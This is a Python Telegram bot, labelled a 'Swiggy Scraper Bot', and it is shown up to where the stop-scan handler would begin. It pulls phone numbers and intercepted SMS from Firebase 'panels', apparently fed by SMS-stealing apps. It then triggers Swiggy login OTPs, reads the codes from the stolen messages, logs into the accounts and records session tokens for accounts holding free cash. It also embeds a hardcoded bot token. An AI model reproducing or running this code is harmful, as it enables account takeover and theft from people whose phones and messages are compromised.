#!/usr/bin/env python3
"""
Swiggy TG Bot — Private Panel Per User
- Flow: /start → Join Channels → Share Referral → Unlock → Add YOUR Panel → Scan
- Each user uploads and manages their OWN panels only
- No panel sharing between users — fully isolated
- 15 workers per user, private aiohttp session
- Admins bypass channel + referral gate
"""

import asyncio
import json
import logging
import os
import re
import sys
import time
import base64
import csv
import random
import uuid
import urllib.parse
import zlib
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Tuple

import aiohttp
import httpx
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    Update,
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telegram.error import TelegramError

# ── Logging ────────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
)
logger = logging.getLogger(__name__)

# ── Config ─────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8646908060:AAGTZni_boQhI8h4gFBpTh0z2kW0ExDBU34")
ADMIN_IDS = {1446058092, 6894923643}

REQUIRED_CHANNELS = [
    {"username": "blankkdealz",     "url": "https://t.me/blankkdealz",      "label": "📢 Blank Dealz"},
    {"username": "earnwithsakx",    "url": "https://t.me/earnwithsakx",     "label": "💰 Earn With Sakx"},
    {"username": "blankdealzzchat", "url": "https://t.me/blankdealzzchat",  "label": "💬 Blank Dealz Chat"},
]

DEFAULT_CAMPAIGN_ID = "ougwl_MjU3MTUyNzI0I1JhaHVs"
DEFAULT_SENDER = "SWIGGY"
DEFAULT_THRESHOLD = 190
DEFAULT_WORKERS = 15
OTP_TIMEOUT = 30
POLL_INTERVAL = 0.5
REFERRALS_FOR_1H = 3
ACCESS_HOURS = 1

STATE_FILE  = Path(__file__).parent / "bot_state.json"
USERS_FILE  = Path(__file__).parent / "users.json"
# Per-user panels: { uid_str: { panel_id: {api_url, auth_key, name, ...}, ... } }
USER_PANELS_FILE = Path(__file__).parent / "user_panels.json"
RESULTS_DIR = Path(__file__).parent / "results"
RESULTS_DIR.mkdir(exist_ok=True)

# ── JSON helpers ───────────────────────────────────────────────────────────────
def load_json(path, default):
    if path.exists():
        try:
            with open(path, "r") as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading {path}: {e}")
    return default

def save_json(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving {path}: {e}")

def load_state():
    return load_json(STATE_FILE, {})
def save_state(s):
    save_json(STATE_FILE, s)

# ── Per-user panels (PRIVATE — no sharing) ────────────────────────────────────
def load_user_panels() -> dict:
    """Returns { uid_str: { panel_id: {...}, ... } }"""
    return load_json(USER_PANELS_FILE, {})

def save_user_panels(data: dict):
    save_json(USER_PANELS_FILE, data)

def get_user_panels(uid: int) -> dict:
    """Get panels for a specific user only."""
    all_panels = load_user_panels()
    return all_panels.get(str(uid), {})

def add_user_panel(uid: int, panel_data: dict) -> str:
    """Add a panel to a specific user. Returns panel_id."""
    all_panels = load_user_panels()
    uid_str = str(uid)
    if uid_str not in all_panels:
        all_panels[uid_str] = {}
    pid = f"p_{int(time.time())}_{len(all_panels[uid_str])}"
    all_panels[uid_str][pid] = panel_data
    save_user_panels(all_panels)
    return pid

def remove_user_panel(uid: int, panel_id: str) -> bool:
    """Remove a specific panel from a user."""
    all_panels = load_user_panels()
    uid_str = str(uid)
    if uid_str in all_panels and panel_id in all_panels[uid_str]:
        del all_panels[uid_str][panel_id]
        save_user_panels(all_panels)
        return True
    return False

# ── User management ────────────────────────────────────────────────────────────
def load_users() -> dict:
    return load_json(USERS_FILE, {})

def save_users(u: dict):
    save_json(USERS_FILE, u)

def get_user(uid: int) -> dict | None:
    return load_users().get(str(uid))

def upsert_user(uid: int, **kwargs):
    users = load_users()
    key = str(uid)
    if key not in users:
        users[key] = {
            "username": "",
            "access_expiry": 0,
            "referrals_given": 0,
            "referred_by": None,
            "joined_at": int(time.time()),
        }
    users[key].update(kwargs)
    save_users(users)
    return users[key]

def has_access(uid: int) -> bool:
    if uid in ADMIN_IDS:
        return True
    u = get_user(uid)
    if not u:
        return False
    return u.get("access_expiry", 0) > time.time()

def grant_access_hours(uid: int, hours: int = ACCESS_HOURS) -> float:
    u = get_user(uid)
    now = time.time()
    current_expiry = u.get("access_expiry", now) if u else now
    new_expiry = max(current_expiry, now) + hours * 3600
    upsert_user(uid, access_expiry=new_expiry)
    return new_expiry

def get_all_user_ids() -> list[int]:
    return [int(k) for k in load_users().keys()]

# ── Channel membership ─────────────────────────────────────────────────────────
async def check_channels(bot, uid: int) -> list[dict]:
    not_joined = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(f"@{ch['username']}", uid)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch)
        except TelegramError:
            not_joined.append(ch)
    return not_joined

def channel_join_keyboard(not_joined: list[dict]) -> InlineKeyboardMarkup:
    buttons = [[InlineKeyboardButton(ch["label"], url=ch["url"])] for ch in not_joined]
    buttons.append([InlineKeyboardButton("✅ I've Joined — Check", callback_data="check_join")])
    return InlineKeyboardMarkup(buttons)

# ── Per-User Session Manager ───────────────────────────────────────────────────
class UserSession:
    """Each member gets their own isolated session + 15 workers."""
    def __init__(self, uid: int):
        self.uid = uid
        self.semaphore = asyncio.Semaphore(DEFAULT_WORKERS)
        self.session: Optional[aiohttp.ClientSession] = None
        self.running_tasks: Dict[str, asyncio.Task] = {}
        self.results: List[dict] = []
        self.total_scanned = 0
        self.total_found = 0
        self.is_running = False

    async def get_session(self) -> aiohttp.ClientSession:
        if self.session is None or self.session.closed:
            connector = aiohttp.TCPConnector(limit=0, force_close=False)
            self.session = aiohttp.ClientSession(connector=connector)
        return self.session

    async def close(self):
        for task in self.running_tasks.values():
            task.cancel()
        self.running_tasks.clear()
        if self.session and not self.session.closed:
            await self.session.close()
        self.session = None
        self.is_running = False

    def reset_results(self):
        self.results = []
        self.total_scanned = 0
        self.total_found = 0

class SessionManager:
    def __init__(self):
        self._sessions: Dict[int, UserSession] = {}

    async def get(self, uid: int) -> UserSession:
        if uid not in self._sessions:
            self._sessions[uid] = UserSession(uid)
        return self._sessions[uid]

    async def remove(self, uid: int):
        if uid in self._sessions:
            await self._sessions[uid].close()
            del self._sessions[uid]

    async def close_all(self):
        for us in list(self._sessions.values()):
            await us.close()
        self._sessions.clear()

session_manager = SessionManager()

# ── Swiggy API Helpers ─────────────────────────────────────────────────────────
def generate_csrf() -> str:
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choices(chars, k=40))

def generate_uuid() -> str:
    return str(uuid.uuid4())

def random_user_agent() -> str:
    return ("Mozilla/5.0 (Linux; Android 14; SM-A065F Build/UP1A.231005.007; wv) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
            "Chrome/150.0.7871.181 Mobile Safari/537.36")

# ── Firebase URL Normalization (bug-fixed) ─────────────────────────────────────
def _normalize_firebase_url(url: str, key: str = "") -> tuple:
    url = url.strip().rstrip("/")
    if url.startswith("http"):
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        if not key:
            for k, v in qs.items():
                if k.lower() in ("key", "auth", "secret", "token"):
                    key = v[0]
                    break
        api_url = (parsed.scheme + "://" + parsed.netloc + parsed.path).rstrip("/")
        # Never let key be a URL
        if key.startswith("http"):
            key = ""
        return api_url, key
    else:
        # Short project ID — prevent double -default-rtdb
        if url.endswith("-default-rtdb"):
            return f"https://{url}.firebaseio.com", key
        elif ".firebaseio.com" in url or ".firebasedatabase.app" in url:
            return f"https://{url}", key
        else:
            return f"https://{url}-default-rtdb.firebaseio.com", key

def decode_merge_panels(panel_url: str) -> list:
    parsed = urllib.parse.urlparse(panel_url)
    fragment = parsed.fragment
    if not fragment.startswith("merge="):
        return []
    b64 = fragment[6:]
    b64_padded = b64 + "=" * ((4 - len(b64) % 4) % 4)
    try:
        raw = base64.b64decode(b64_padded)
    except Exception:
        return []
    decoded = ""
    try:
        decoded = zlib.decompress(raw, -15).decode("utf-8")
    except Exception:
        pass
    if not decoded:
        try:
            decoded = raw.decode("latin-1")
        except Exception:
            pass
    if not decoded:
        return []
    panels = []
    try:
        stripped = decoded.strip()
        if stripped.startswith("["):
            shared = json.loads(stripped)
            for item in shared:
                u = item.get("url", "") or item.get("u", "")
                k = item.get("key", "") or item.get("k", "")
                if u:
                    panels.append(_normalize_firebase_url(u, k))
        else:
            for part in stripped.split(","):
                part = part.strip()
                if not part:
                    continue
                segments = part.split("|", 1)
                u = segments[0].strip()
                k = segments[1].strip() if len(segments) > 1 else ""
                if u:
                    panels.append(_normalize_firebase_url(u, k))
    except Exception as e:
        logger.error(f"decode_merge_panels parse error: {e}")
    return panels

def get_panel_api_url(panel_url: str):
    parsed_pre = urllib.parse.urlparse(panel_url)
    if parsed_pre.fragment.startswith("merge="):
        panels = decode_merge_panels(panel_url)
        if panels:
            return panels[0]
        return None, None

    panel_url_clean = panel_url.split("#")[0]
    parsed = urllib.parse.urlparse(panel_url_clean)
    qs = urllib.parse.parse_qs(parsed.query)

    s_param = qs.get("s", [""])[0]
    if s_param:
        s_param_padded = s_param + "=" * ((4 - len(s_param) % 4) % 4)
        try:
            decoded = base64.b64decode(s_param_padded).decode('utf-8')
            for sep in ['|||', '|']:
                if sep in decoded:
                    parts = decoded.split(sep)
                    if len(parts) >= 2:
                        firebase_url = parts[0].strip()
                        api_key = parts[1].strip()
                        if firebase_url:
                            return firebase_url.rstrip("/"), api_key
        except Exception:
            pass

    if ".firebaseio.com" in panel_url_clean or ".firebasedatabase.app" in panel_url_clean:
        url = panel_url_clean.split("?")[0].split(".json")[0].rstrip("/")
        auth_key = ""
        for k, v in qs.items():
            if k.lower() in ("key", "auth", "secret", "token"):
                auth_key = v[0]
                break
        if auth_key.startswith("http"):
            auth_key = ""
        return url, auth_key

    url = panel_url_clean.split("?")[0].rstrip("/")
    auth_key = ""
    for k, v in qs.items():
        if k.lower() in ("key", "auth", "secret", "token", "apikey", "api_key"):
            auth_key = v[0]
            break
    if auth_key.startswith("http"):
        auth_key = ""
    return url, auth_key

# ── Firebase async helpers ─────────────────────────────────────────────────────
def fb_url(base: str, auth_key: str = "", **extra) -> str:
    params = {}
    if auth_key:
        if auth_key.startswith("http"):
            auth_key = ""
        if auth_key:
            params["auth"] = auth_key
    params.update(extra)
    if not params:
        return base
    sep = "&" if "?" in base else "?"
    return base + sep + "&".join(f"{k}={v}" for k, v in params.items())

async def fb_fetch(client: httpx.AsyncClient, url: str, timeout: int = 10):
    try:
        resp = await client.get(url, timeout=timeout)
        if resp.status_code == 200:
            return resp.json(), None
        return None, f"HTTP {resp.status_code}"
    except Exception as e:
        return None, str(e)

async def fetch_phones_async(client: httpx.AsyncClient, api_url: str, auth_key: str, limit: int = 100) -> List[Tuple[str, str]]:
    """Fetch phones from a user's private panel."""
    if not api_url:
        return []
    base = api_url.rstrip("/") + "/"

    clients_data, _ = await fb_fetch(client, fb_url(f"{base}clients/.json", auth_key))
    if not clients_data or not isinstance(clients_data, dict):
        clients_data, _ = await fb_fetch(client, fb_url(f"{base}devices/.json", auth_key))
    if not clients_data or not isinstance(clients_data, dict):
        return []

    phones = []
    for c_id, c_data in clients_data.items():
        if len(phones) >= limit:
            break
        if not isinstance(c_data, dict):
            continue
        phone = (c_data.get("mobNo") or c_data.get("phone") or
                 c_data.get("mobile") or c_data.get("number") or
                 c_data.get("phoneNumber") or "")
        if phone:
            phone = re.sub(r'\D', '', str(phone))
            if len(phone) == 10 and phone[0] in "6789":
                phones.append((phone, c_id))
                continue
        msgs_data, _ = await fb_fetch(client, fb_url(f"{base}messages/{c_id}/.json", auth_key))
        if msgs_data and isinstance(msgs_data, dict):
            for msg in msgs_data.values():
                if not isinstance(msg, dict):
                    continue
                text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                match = re.search(r'\b([6-9]\d{9})\b', text)
                if match:
                    phones.append((match.group(1), c_id))
                    break
    return phones

# ── OTP Poller ─────────────────────────────────────────────────────────────────
async def poll_otp_from_panel(
    firebase_url: str,
    device_id: str,
    sender_keyword: str,
    session: aiohttp.ClientSession,
    api_key: Optional[str] = None,
    timeout: int = OTP_TIMEOUT,
    poll_interval: float = POLL_INTERVAL,
    trigger_time: Optional[int] = None,
) -> Optional[str]:
    if trigger_time is None:
        trigger_time = int(time.time() * 1000)
    start = time.time()
    base_url = firebase_url.rstrip('/') + '/'

    while time.time() - start < timeout:
        try:
            url = f"{base_url}messages/{device_id}.json"
            if api_key:
                url += f"?auth={api_key}"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                if resp.status != 200:
                    await asyncio.sleep(poll_interval)
                    continue
                msgs = await resp.json()
                if not msgs:
                    await asyncio.sleep(poll_interval)
                    continue
                for msg_id in sorted(msgs.keys(), reverse=True):
                    msg_data = msgs[msg_id]
                    if not isinstance(msg_data, dict):
                        continue
                    msg_ts = None
                    for field in ["timestamp", "time", "sentTimestamp", "date", "createdAt", "id"]:
                        if field in msg_data and msg_data[field]:
                            try:
                                msg_ts = int(msg_data[field])
                                break
                            except (ValueError, TypeError):
                                pass
                    if msg_ts is None:
                        try:
                            msg_ts = int(msg_id)
                        except (ValueError, TypeError):
                            continue
                    if msg_ts < trigger_time - 10000:
                        continue
                    if time.time() * 1000 - msg_ts > 120000:
                        continue
                    sender = msg_data.get("sender", "")
                    if sender_keyword.lower() in sender.lower():
                        body = msg_data.get("body") or msg_data.get("message") or ""
                        otp_match = re.search(r'OTP\s*(\d{4,6})', body, re.IGNORECASE)
                        if otp_match:
                            return otp_match.group(1)
                        fallback = re.search(r'(?<!\d)(\d{4,6})(?!\d)', body)
                        if fallback:
                            return fallback.group(1)
                await asyncio.sleep(poll_interval)
        except asyncio.CancelledError:
            return None
        except Exception:
            await asyncio.sleep(poll_interval)
    return None

# ── Swiggy Client ──────────────────────────────────────────────────────────────
class SwiggyClient:
    def __init__(self, session: aiohttp.ClientSession):
        self.session = session
        self.csrf = generate_csrf()
        self.device_id = generate_uuid()
        self.tid = None
        self.token = None
        self.user_id = None

    def _build_headers(self, extra: dict = None) -> dict:
        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://www.swiggy.com',
            'referer': 'https://www.swiggy.com/auth',
            'sec-ch-ua': '"Android WebView";v="149", "Chromium";v="149"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': random_user_agent(),
        }
        if extra:
            headers.update(extra)
        return headers

    async def send_otp(self, phone: str) -> bool:
        signin_url = "https://www.swiggy.com/mapi/auth/signin-check"
        signin_data = {"mobile": phone, "countryCode": "91", "countryKey": "IN", "_csrf": self.csrf}
        try:
            async with self.session.post(signin_url, json=signin_data, headers=self._build_headers(),
                                         timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status != 200:
                    return False
                data = await resp.json()
                if not data.get('data', {}).get('registered', False):
                    return False
        except Exception:
            return False

        otp_url = "https://www.swiggy.com/mapi/auth/sms-otp"
        otp_data = {"mobile": phone, "_csrf": self.csrf}
        try:
            async with self.session.post(otp_url, json=otp_data, headers=self._build_headers(),
                                         timeout=aiohttp.ClientTimeout(total=10)) as resp:
                return resp.status == 200
        except Exception:
            return False

    async def verify_otp(self, phone: str, otp: str) -> bool:
        verify_url = "https://www.swiggy.com/mapi/auth/otp-verify"
        verify_data = {"otp": otp, "_csrf": self.csrf}
        try:
            async with self.session.post(verify_url, json=verify_data, headers=self._build_headers(),
                                         timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status != 200:
                    return False
                data = await resp.json()
                if data.get('statusCode') != 0:
                    return False
                self.token = data.get('data', {}).get('token')
                self.tid = data.get('tid')
                self.user_id = str(data.get('data', {}).get('customer_id'))
                return bool(self.token and self.tid)
        except Exception:
            return False

    async def get_free_cash(self, campaign_id: str) -> Optional[int]:
        if not self.token or not self.tid:
            return None
        url = "https://spns.swiggy.com/api/v1/campaign/rewards"
        headers = {
            'client-id': 'portal',
            'tid': self.tid,
            'token': self.token,
            'user-agent': random_user_agent(),
            'content-type': 'application/json',
            'accept': '*/*',
            'origin': 'https://webviews.swiggy.com',
            'x-requested-with': 'in.swiggy.android',
            'referer': 'https://webviews.swiggy.com/',
        }
        payload = {
            "generalContext": {"requestContext": {"clientId": "portal_invite"}},
            "campaignRewardRequests": [{
                "campaignType": "CAMPAIGN_TYPE_BUZZ_MONEY_STREAKS",
                "campaignId": campaign_id,
                "rollingFreecashParams": {
                    "forceRefresh": True,
                    "requestParams": {
                        "dataRequested": "wallet,connections,transactions",
                        "consumerName": "User",
                        "source": "invite"
                    }
                }
            }]
        }
        try:
            async with self.session.post(url, json=payload, headers=headers,
                                         timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if resp.status != 200:
                    return None
                data = await resp.json()
                if data.get('statusCode') != 0:
                    return None
                reward_responses = data.get('data', {}).get('campaignRewardResponses', [])
                if not reward_responses:
                    return None
                rewards = reward_responses[0].get('rewards', [])
                for reward in rewards:
                    if reward.get('rewardType') == 'REWARD_TYPE_ROLLING_FREECASH':
                        total_str = reward.get('rollingFreecash', {}).get(
                            'totalEarned', {}).get('units', '0')
                        try:
                            return int(total_str)
                        except (ValueError, TypeError):
                            return 0
                return 0
        except Exception:
            return None

# ── Process one phone ──────────────────────────────────────────────────────────
async def process_phone(
    phone: str,
    device_id: str,
    api_url: str,
    auth_key: str,
    sender_keyword: str,
    campaign_id: str,
    threshold: int,
    user_session: UserSession,
    progress_callback=None,
) -> Optional[Dict]:
    async with user_session.semaphore:
        session = await user_session.get_session()
        client = SwiggyClient(session)

        if not await client.send_otp(phone):
            if progress_callback:
                await progress_callback(phone, "❌ OTP failed")
            return None

        trigger_time = int(time.time() * 1000)
        otp = await poll_otp_from_panel(
            firebase_url=api_url,
            device_id=device_id,
            sender_keyword=sender_keyword,
            session=session,
            api_key=auth_key,
            trigger_time=trigger_time,
        )
        if not otp:
            if progress_callback:
                await progress_callback(phone, "⏰ OTP timeout")
            return None

        if not await client.verify_otp(phone, otp):
            if progress_callback:
                await progress_callback(phone, "❌ Verify failed")
            return None

        free_cash = await client.get_free_cash(campaign_id)
        user_session.total_scanned += 1

        if free_cash is None:
            if progress_callback:
                await progress_callback(phone, "❌ Cash error")
            return None

        if free_cash >= threshold:
            user_session.total_found += 1
            result = {
                "phone": phone,
                "device": device_id,
                "free_cash": free_cash,
                "user_id": client.user_id,
                "tid": client.tid,
                "token": client.token,
            }
            user_session.results.append(result)
            if progress_callback:
                await progress_callback(phone, f"✅ ₹{free_cash}")
            return result
        else:
            if progress_callback:
                await progress_callback(phone, f"₹{free_cash}")
            return None

# ── Run scraper for a user ────────────────────────────────────────────────────
async def run_scraper(
    uid: int,
    app,
    panel_key: str,
    sender_keyword: str,
    campaign_id: str,
    threshold: int,
    phone_limit: int = 100,
):
    us = await session_manager.get(uid)
    if us.is_running:
        return
    us.is_running = True
    us.reset_results()

    # Load THIS user's panels only
    my_panels = get_user_panels(uid)
    panel_config = my_panels.get(panel_key)
    if not panel_config:
        try:
            await app.bot.send_message(uid, "❌ Panel not found. It may have been removed.")
        except Exception:
            pass
        us.is_running = False
        return

    api_url = panel_config.get("api_url", "")
    auth_key = panel_config.get("auth_key", "")

    status_msg = None
    try:
        status_msg = await app.bot.send_message(
            uid,
            f"🔍 *Scraper Starting...*
"
            f"Panel: {panel_config.get('name', 'Unknown')}
"
            f"Threshold: ₹{threshold}
"
            f"Workers: {DEFAULT_WORKERS}
"
            f"Fetching phones...",
            parse_mode="Markdown",
        )
    except Exception:
        pass

    phones = []
    async with httpx.AsyncClient() as fb_client:
        phones = await fetch_phones_async(fb_client, api_url, auth_key, limit=phone_limit)

    if not phones:
        try:
            await app.bot.send_message(uid, "❌ No phones found in your panel. Check your panel link.")
        except Exception:
            pass
        us.is_running = False
        return

    total = len(phones)
    last_update = time.time()

    async def on_progress(phone: str, status: str):
        nonlocal last_update
        now = time.time()
        if now - last_update < 3:
            return
        last_update = now
        try:
            text = (
                f"⏳ *Scanning...*
"
                f"━━━━━━━━━━━━━━━━━━━━━━
"
                f"📱 Scanned: {us.total_scanned}/{total}
"
                f"✅ Found: {us.total_found}
"
                f"🔄 Last: `{phone}` → {status}
"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            )
            if status_msg:
                await app.bot.edit_message_text(text, uid, status_msg.message_id, parse_mode="Markdown")
        except Exception:
            pass

    tasks = [
        process_phone(phone, device, api_url, auth_key, sender_keyword, campaign_id, threshold, us, on_progress)
        for phone, device in phones
    ]

    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        pass

    # Save results
    if us.results:
        filename = RESULTS_DIR / f"uid{uid}_{int(time.time())}.csv"
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=us.results[0].keys())
            writer.writeheader()
            writer.writerows(us.results)

    result_text = (
        f"🏁 *Scan Complete!*
"
        f"━━━━━━━━━━━━━━━━━━━━━━
"
        f"📱 Total Scanned: {us.total_scanned}
"
        f"✅ Found (≥₹{threshold}): {us.total_found}
"
        f"━━━━━━━━━━━━━━━━━━━━━━
"
    )
    if us.results:
        result_text += "
🏆 *Good Accounts:*
"
        for r in us.results[:20]:
            result_text += f"  • `{r['phone']}` → ₹{r['free_cash']}
"
        if len(us.results) > 20:
            result_text += f"  ...and {len(us.results) - 20} more
"
        result_text += f"
📁 Full results saved to CSV"
    else:
        result_text += "
❌ No qualifying accounts found"

    try:
        await app.bot.send_message(uid, result_text, parse_mode="Markdown")
    except Exception:
        pass

    us.is_running = False

# ── /start ─────────────────────────────────────────────────────────────────────
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    username = update.effective_user.username or ""
    args = context.args or []

    upsert_user(uid, username=username)

    # ── Referral handling ──────────────────────────────────────────────────────
    if args and args[0].startswith("r"):
        try:
            referrer_id = int(args[0][1:])
            if referrer_id != uid:
                u = get_user(uid)
                if u and u.get("referred_by") is None:
                    upsert_user(uid, referred_by=referrer_id)
                    ref_data = get_user(referrer_id)
                    if ref_data is not None:
                        old_refs = ref_data.get("referrals_given", 0)
                        new_refs = old_refs + 1
                        upsert_user(referrer_id, referrals_given=new_refs)
                        if new_refs % REFERRALS_FOR_1H == 0:
                            expiry = grant_access_hours(referrer_id, ACCESS_HOURS)
                            exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m")
                            try:
                                await context.bot.send_message(
                                    referrer_id,
                                    f"🎉 *Congratulations!*
"
                                    f"Tumhare {new_refs} referrals ho gaye!
"
                                    f"✅ *1 ghante ka access mil gaya!*
"
                                    f"Expires: `{exp_str}`",
                                    parse_mode="Markdown",
                                )
                            except Exception:
                                pass
                        else:
                            remaining = REFERRALS_FOR_1H - (new_refs % REFERRALS_FOR_1H)
                            try:
                                await context.bot.send_message(
                                    referrer_id,
                                    f"👥 *New referral!*
"
                                    f"Total: {new_refs} | Aur {remaining} chahiye access ke liye",
                                    parse_mode="Markdown",
                                )
                            except Exception:
                                pass
        except (ValueError, IndexError):
            pass

    # ── Step 1: Check channel join ────────────────────────────────────────────
    if uid not in ADMIN_IDS:
        not_joined = await check_channels(context.bot, uid)
        if not_joined:
            kb = channel_join_keyboard(not_joined)
            await update.message.reply_text(
                "👋 *Welcome to Swiggy Scraper Bot!*

"
                "📢 *Step 1:* Pehle in channels ko join karo,
"
                "phir bot use kar sakte ho:",
                parse_mode="Markdown",
                reply_markup=kb,
            )
            return

    # ── Step 2: Check access (referral gate) ──────────────────────────────────
    if uid not in ADMIN_IDS and not has_access(uid):
        bot_info = await context.bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
        u = get_user(uid)
        refs = u.get("referrals_given", 0) if u else 0
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)

        await update.message.reply_text(
            f"✅ *Channels joined!*

"
            f"🔗 *Step 2:* Share your referral link to unlock the bot.

"
            f"━━━━━━━━━━━━━━━━━━━━━━
"
            f"📲 *Your Referral Link:*
"
            f"`{ref_link}`

"
            f"👥 Current referrals: `{refs}`
"
            f"Aur *{needed}* aur chahiye = 1 ghanta access

"
            f"💡 Har 3 referrals = 1 ghante ka access!
"
            f"Share karo aur bot unlock karo 🚀",
            parse_mode="Markdown",
        )
        return

    # ── Step 3: Has access — show main menu ───────────────────────────────────
    await show_main_menu(update, context)

# ── Main menu ──────────────────────────────────────────────────────────────────
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    is_admin = uid in ADMIN_IDS

    my_panels = get_user_panels(uid)
    panel_count = len(my_panels)

    bot_info = await context.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"

    u = get_user(uid)
    refs = u.get("referrals_given", 0) if u else 0
    expiry = u.get("access_expiry", 0) if u else 0

    if is_admin:
        access_str = "♾ Unlimited (Admin)"
    elif expiry > time.time():
        exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m/%Y")
        access_str = f"✅ Active till {exp_str}"
    else:
        needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
        access_str = f"⛔ Expired | {needed} more refer needed"

    keyboard = ReplyKeyboardMarkup(
        [["🔍 Start Scan", "⏹ Stop Scan"],
         ["➕ Add My Panel", "❌ Remove My Panel"],
         ["📋 My Panels", "📊 My Status"],
         ["🔗 My Referral", "⏳ My Access"]],
        resize_keyboard=True,
    )

    role = "👑 *Admin*" if is_admin else "👤 *Member*"

    await update.effective_message.reply_text(
        f"🛒 *Swiggy Scraper Bot*
"
        f"━━━━━━━━━━━━━━━━━━━━━━
"
        f"Role: {role}
"
        f"Access: {access_str}
"
        f"📦 Your Panels: {panel_count}
"
        f"👥 Referrals: {refs}
"
        f"━━━━━━━━━━━━━━━━━━━━━━
"
        f"🔒 *Your panels are PRIVATE*
"
        f"Nobody else can see or use them.

"
        f"🔗 Referral: `{ref_link}`",
        parse_mode="Markdown",
        reply_markup=keyboard,
    )

# ── Check join callback ────────────────────────────────────────────────────────
async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    not_joined = await check_channels(context.bot, uid)
    if not_joined:
        kb = channel_join_keyboard(not_joined)
        await query.edit_message_text(
            "❌ *Abhi bhi kuch channels join nahi kiye:*",
            parse_mode="Markdown",
            reply_markup=kb,
        )
    else:
        # Channels joined — now check referral gate
        if uid not in ADMIN_IDS and not has_access(uid):
            bot_info = await context.bot.get_me()
            ref_link = f"https://t.me/{bot_info.username}?start=r{uid}"
            u = get_user(uid)
            refs = u.get("referrals_given", 0) if u else 0
            needed = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)

            await query.edit_message_text(
                f"✅ *Channels joined!*

"
                f"🔗 *Step 2:* Share your referral link to unlock the bot.

"
                f"📲 *Your Referral Link:*
"
                f"`{ref_link}`

"
                f"👥 Current referrals: `{refs}`
"
                f"Aur *{needed}* aur chahiye = 1 ghanta access

"
                f"💡 Har 3 referrals = 1 ghante ka access!",
                parse_mode="Markdown",
            )
        else:
            await query.edit_message_text(
                "✅ *Sab channels join ho gaye! Welcome!*",
                parse_mode="Markdown",
            )
            await show_main_menu(update, context)

# ── Start Scan ─────────────────────────────────────────────────────────────────
async def start_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    if uid not in ADMIN_IDS and not has_access(uid):
        await update.message.reply_text("⛔ Access expired. Share your referral link to unlock!")
        return

    my_panels = get_user_panels(uid)
    if not my_panels:
        await update.message.reply_text(
            "❌ *Tumhare paas koi panel nahi hai!*

"
            "➕ *Add My Panel* dabao aur apna Firebase panel link add karo.
"
            "Sirf tumhare panels use honge — koi aur nahi.",
            parse_mode="Markdown",
        )
        return

    us = await session_manager.get(uid)
    if us.is_running:
        await update.message.reply_text("⚠️ Scan already running! Use ⏹ Stop Scan first.")
        return

    # Show panel selector
    if len(my_panels) == 1:
        pk = list(my_panels.keys())[0]
        context.user_data["selected_panel"] = pk
        await update.message.reply_text(
            f"✅ Panel auto-selected: *{my_panels[pk].get('name', 'Unknown')}*

"
            f"Send settings:
"
            f"`threshold campaign_id sender`

"
            f"Example: `190 {DEFAULT_CAMPAIGN_ID} SWIGGY`

"
            f"Or just send `default` for defaults",
            parse_mode="Markdown",
        )
        context.user_data["awaiting_scan_settings"] = True
        return

    buttons = []
    for pk, pc in my_panels.items():
        buttons.append([InlineKeyboardButton(pc.get("name", "Unknown"), callback_data=f"panel_{pk}")])
    await update.message.reply_text(
        "📋 *Select YOUR panel to scan:*",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(buttons),
    )

async def panel_selected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    data = query.data
    if not data.startswith("panel_"):
        return

    pk = data[6:]
    my_panels = get_user_panels(uid)
    if pk not in my_panels:
        await query.edit_message_text("❌ Panel not found.")
        return

    context.user_data["selected_panel"] = pk
    await query.edit_message_text(
        f"✅ Selected: *{my_panels[pk].get('name', 'Unknown')}*

"
        f"Send settings:
"
        f"`threshold campaign_id sender`

"
        f"Example: `190 {DEFAULT_CAMPAIGN_ID} SWIGGY`

"
        f"Or just send `default` for defaults",
        parse_mode="Markdown",
    )
    context.user_data["awaiting_scan_settings"] = True

# ── Stop Scan ──────────────────────────────────────────────────────────────────
